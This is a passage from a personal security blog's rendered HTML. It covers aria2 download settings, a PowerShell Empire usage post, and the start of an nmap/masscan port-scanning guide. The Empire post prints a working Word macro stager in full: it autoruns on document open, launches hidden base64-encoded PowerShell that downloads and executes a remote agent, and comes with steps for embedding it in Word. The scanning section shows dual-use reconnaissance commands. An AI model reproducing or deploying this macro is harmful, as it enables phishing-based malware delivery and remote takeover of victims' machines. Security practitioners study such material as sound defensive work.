class="line">max-upload-limit=0</span><br><span class="line">#断开速度过慢的连接</span><br><span class="line">#lowest-speed-limit=0</span><br><span class="line">#验证用，需要1.16.1之后的release版本</span><br><span class="line">#referer=*</span><br><span class="line">#文件保存路径, 默认为当前启动位置</span><br><span class="line">dir=/Users/hostname/Downloads</span><br><span class="line">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span><br><span class="line">#disk-cache=0</span><br><span class="line">#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)</span><br><span class="line">#enable-mmap=true</span><br><span class="line">#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长</span><br><span class="line">#所需时间 none &lt; falloc ? trunc &lt;&lt; prealloc, falloc和trunc需要文件系统和内核支持</span><br><span class="line">file-allocation=none</span><br><span class="line">#不进行证书校验</span><br><span class="line">check-certificate=false</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Run"><a href="#0x03-Run" class="headerlink" title="0x03 Run"></a>0x03 Run</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; aria2c    #so open Aria2GUI.app to add file download</span><br><span class="line">or</span><br><span class="line">&gt; aria2c http://www.example.com/test.zip    # download http</span><br><span class="line">&gt; aria2c file1.torrent      # download torrent</span><br><span class="line">&gt; aria2c &quot;magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&amp;dn=aria2&quot;  # download magnet</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/03/25/Empire-Usage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/03/25/Empire-Usage/" itemprop="url">Empire Usage</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-25T23:47:19+08:00">
+                2017-03-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>&gt; python empire</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">====================================================================================</span><br><span class="line"> Empire: PowerShell post-exploitation agent | [Version]: 1.6.0</span><br><span class="line">====================================================================================</span><br><span class="line"> [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3</span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       180 modules currently loaded</span><br><span class="line"></span><br><span class="line">       1 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">(Empire: listeners) &gt; usestager macro test</span><br><span class="line">(Empire: stager/macro) &gt; execute</span><br><span class="line">[*] Stager output written out to: /tmp/macro</span><br><span class="line"></span><br><span class="line">(Empire: stager/macro) &gt; [+] Initial agent 1EBMCTEWVZDNM13U from 192.168.1.205 now active</span><br><span class="line">(Empire: stager/macro) &gt; agents</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line">  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen</span><br><span class="line">  ---------          -----------     ------------    ---------           -------             -----    --------------------</span><br><span class="line">  1EBMCTEWVZDNM13U   192.168.1.205   WIN             *WIN\hello         powershell/4272     5/0.0    2017-03-25 20:27:37</span><br></pre></td></tr></table></figure>
+<p><strong>&gt; cat /tmp/macro</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">	Debugging</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Document_Open()</span><br><span class="line">	Debugging</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Public Function Debugging() As Variant</span><br><span class="line">	Dim Str As String</span><br><span class="line">	str = &quot;powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBT&quot;</span><br><span class="line">	str = str + &quot;AFkAcwB0AGUAbQAuAE4ARQB0AC4AUwBFAFIAVgBpAGMARQBQAG&quot;</span><br><span class="line">	str = str + &quot;8ASQBOAHQATQBBAE4AQQBnAGUAUgBdADoAOgBFAHgAUABFAEMA&quot;</span><br><span class="line">	str = str + &quot;VAAxADAAMABDAG8AbgB0AEkATgBVAEUAIAA9ACAAMAA7ACQAVw&quot;</span><br><span class="line">	str = str + &quot;BDAD0ATgBFAFcALQBPAGIASgBlAGMAdAAgAFMAWQBzAHQARQBN&quot;</span><br><span class="line">	str = str + &quot;AC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AdAA7ACQAdQA9AC&quot;</span><br><span class="line">	str = str + &quot;cATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8A&quot;</span><br><span class="line">	str = str + &quot;dwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVA&quot;</span><br><span class="line">	str = str + &quot;ByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAw&quot;</span><br><span class="line">	str = str + &quot;ACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAE&quot;</span><br><span class="line">	str = str + &quot;gARQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEA&quot;</span><br><span class="line">	str = str + &quot;ZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBPAFgAeQ&quot;</span><br><span class="line">	str = str + &quot;AgAD0AIABbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBXAEUAYgBS&quot;</span><br><span class="line">	str = str + &quot;AEUAUQBVAGUAUwB0AF0AOgA6AEQARQBmAEEAdQBMAHQAVwBlAE&quot;</span><br><span class="line">	str = str + &quot;IAUAByAE8AeAB5ADsAJAB3AGMALgBQAHIATwB4AHkALgBDAHIA&quot;</span><br><span class="line">	str = str + &quot;ZQBkAEUATgB0AEkAYQBsAFMAIAA9ACAAWwBTAHkAUwBUAGUATQ&quot;</span><br><span class="line">	str = str + &quot;AuAE4AZQBUAC4AQwBSAGUARABFAE4AVABJAEEATABDAEEAQwBo&quot;</span><br><span class="line">	str = str + &quot;AGUAXQA6ADoARABlAEYAYQBVAEwAdABOAGUAdAB3AE8AcgBLAE&quot;</span><br><span class="line">	str = str + &quot;MAcgBlAEQAZQBOAFQAaQBhAEwAUwA7ACQASwA9ACcAVABFAGMA&quot;</span><br><span class="line">	str = str + &quot;ewBZAEAAXgBMAEkASgB4AFYAZwAxAHAAWgBhADIAVQAzAEYAaQ&quot;</span><br><span class="line">	str = str + &quot;BOAEgAXQBgAD8AcgBCAHUAJQAqACcAOwAkAGkAPQAwADsAWwBj&quot;</span><br><span class="line">	str = str + &quot;AEgAQQBSAFsAXQBdACQAQgA9ACgAWwBjAEgAQQBSAFsAXQBdAC&quot;</span><br><span class="line">	str = str + &quot;gAJAB3AGMALgBEAE8AVwBOAEwAbwBhAGQAUwBUAFIASQBuAGcA&quot;</span><br><span class="line">	str = str + &quot;KAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALg&quot;</span><br><span class="line">	str = str + &quot;AyADAANgA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAi&quot;</span><br><span class="line">	str = str + &quot;ACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABrAFsAJABJAC&quot;</span><br><span class="line">	str = str + &quot;sAKwAlACQAawAuAEwARQBOAEcAdABIAF0AfQA7AEkARQBYACAA&quot;</span><br><span class="line">	str = str + &quot;KAAkAEIALQBKAE8ASQBuACcAJwApAA==&quot;</span><br><span class="line">	Const HIDDEN_WINDOW = 0</span><br><span class="line">	strComputer = &quot;.&quot;</span><br><span class="line">	Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)</span><br><span class="line">	Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">	Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">	objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line">	Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2:Win32_Process&quot;)</span><br><span class="line">	objProcess.Create str, Null, objConfig, intProcessID</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure></p>
+<p>打开Word&gt;&gt;视图&gt;&gt;宏&gt;&gt;查看宏&gt;&gt;输入宏名&gt;&gt;创建&gt;&gt;输入macro中内容&gt;&gt;保存</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/03/09/Port-Scanner-via-Nmap-Masscan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/03/09/Port-Scanner-via-Nmap-Masscan/" itemprop="url">Port Scanner via Nmap && Masscan</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-09T18:59:28+08:00">
+                2017-03-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Install-to-Mac"><a href="#Install-to-Mac" class="headerlink" title="Install to Mac"></a>Install to Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install nmap</span><br><span class="line">&gt; brew install masscan</span><br></pre></td></tr></table></figure>
+<h3 id="Nmap-Usage"><a href="#Nmap-Usage" class="headerlink" title="Nmap Usage"></a>Nmap Usage</h3><p><strong>nmap -h</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">Nmap 7.40 ( https://nmap.org )</span><br><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sn: Ping Scan - disable port scan</span><br><span class="line">  -Pn: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports</span><br><span class="line">  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes</span><br><span class="line">  -PO[protocol list]: IP Protocol Ping</span><br><span class="line">  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]</span><br><span class="line">  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers</span><br><span class="line">  --system-dns: Use OS&apos;s DNS resolver</span><br><span class="line">  --traceroute: Trace hop path to each host</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans</span><br><span class="line">  -sU: UDP Scan</span><br><span class="line">  -sN/sF/sX: TCP Null, FIN, and Xmas scans</span><br><span class="line">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;: Idle scan</span><br><span class="line">  -sY/sZ: SCTP INIT/COOKIE-ECHO scans</span><br><span class="line">  -sO: IP protocol scan</span><br><span class="line">  -b &lt;FTP relay host&gt;: FTP bounce scan</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span><br><span class="line">  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning</span><br><span class="line">  -F: Fast mode - Scan fewer ports than the default scan</span><br><span class="line">  -r: Scan ports consecutively - don&apos;t randomize</span><br><span class="line">  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports</span><br><span class="line">  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</span><br><span class="line">SERVICE/VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service/version info</span><br><span class="line">  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)</span><br><span class="line">  --version-light: Limit to most likely probes (intensity 2)</span><br><span class="line">  --version-all: Try every single probe (intensity 9)</span><br><span class="line">  --version-trace: Show detailed version scan activity (for debugging)</span><br><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script=default</span><br><span class="line">  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file=filename: provide NSE script args in a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help=&lt;Lua scripts&gt;: Show help about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  Options which take &lt;time&gt; are in seconds, or append &apos;ms&apos; (milliseconds),</span><br><span class="line">  &apos;s&apos; (seconds), &apos;m&apos; (minutes), or &apos;h&apos; (hours) to the value (e.g. 30m).</span><br><span class="line">  -T&lt;0-5&gt;: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization</span><br><span class="line">  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.</span><br><span class="line">  --host-timeout &lt;time&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes</span><br><span class="line">  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">FIREWALL/IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g/--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies</span><br><span class="line">  --data &lt;hex string&gt;: Append a custom payload to sent packets</span><br><span class="line">  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ip-options &lt;options&gt;: Send packets with specified ip options</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address</span><br><span class="line">  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output in the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use -vv or more for greater effect)</span><br><span class="line">  -d: Increase debugging level (use -dd or more for greater effect)</span><br><span class="line">  --reason: Display the reason a port is in a particular state</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --webxml: Reference stylesheet from Nmap.Org for more portable XML</span><br><span class="line">  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enable OS detection, version detection, script scanning, and traceroute</span><br><span class="line">  --datadir &lt;dirname&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth/--send-ip: Send using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  --unprivileged: Assume the user lacks raw socket privileges</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">  nmap -v -iR 10000 -Pn -p 80</span><br><span class="line">SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</span><br></pre></td></tr></table></figure>
+<p><strong>NSE Categories</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auth</span><br><span class="line">broadcast</span><br><span class="line">brute</span><br><span class="line">default</span><br><span class="line">discovery</span><br><span class="line">dos</span><br><span class="line">exploit</span><br><span class="line">external</span><br><span class="line">fuzzer</span><br><span class="line">intrusive</span><br><span class="line">malware</span><br><span class="line">safe</span><br><span class="line">version</span><br><span class="line">vuln</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo nmap -sS -Pn -n -v -sn -T5 -iL ips.txt</span><br><span class="line">&gt; sudo nmap -sS -Pn -n -v --open -p 80 -sV -T5 -O --host-timeout=180000 -iL ips.txt</span><br><span class="line">&gt; wget https://raw.githubusercontent.com/maaaaz/nmaptocsv/master/nmaptocsv.py</span><br><span class="line">&gt; python nmaptocsv.py -i test.nmap -f ip-fqdn-port-protocol-service-version-os</span><br><span class="line">or</span><br><span class="line">&gt; python nmaptocsv.py -i test.gnmap -f ip-fqdn-port-protocol-service-version-os</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.2;test.lan;135;tcp;msrpc;Microsoft Windows RPC;Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">192.168.1.2;test.lan;139;tcp;netbios-ssn;;Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">192.168.1.2;test.lan;445;tcp;netbios-ssn;;Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">192.168.1.2;test.lan;5357;tcp;http;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP);Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br></pre></td></tr></table></figure>
+<p><strong>Import Metasploit</strong></p>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_import test.xml</span><br><span class="line">msf &gt; hosts</span><br></pre></td></tr></table></figure>
+<h3 id="Masscan-Using"><a href="#Masscan-Using" class="headerlink" title="Masscan Using"></a>Masscan Using</h3><p><strong>masscan –nmap</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Usage: masscan [Options] -p&#123;Target-Ports&#125; &#123;Target-IP-Ranges&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)</span><br><span class="line">  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  --exclude 